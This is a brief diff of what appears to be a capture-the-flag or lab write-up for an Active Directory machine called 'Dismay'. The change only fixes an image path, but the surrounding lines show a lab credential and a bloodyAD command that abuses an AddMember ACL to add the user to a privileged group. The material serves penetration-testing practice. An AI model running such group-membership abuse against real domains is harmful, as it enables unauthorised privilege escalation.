@@ -664,7 +664,7 @@ DC1  [+] dismay.hsm\\mike.silver:HackSmarter123
 
 ## Mike.silver has the AddMember ACL set.
 
-![BloodHound - Mike.silver AddMember ACL](assets/writeups/Dismay/BH(2).png)
+![BloodHound - Mike.silver AddMember ACL](assets/writeups/Dismay/BH2.png)
 
 \`\`\`text
 bloodyAD --host "10.1.44.140" -d "dismay.hsm" -u "mike.silver" -p "HackSmarter123" add groupMember 'SHARES_OPERATORS' 'mike.silver'
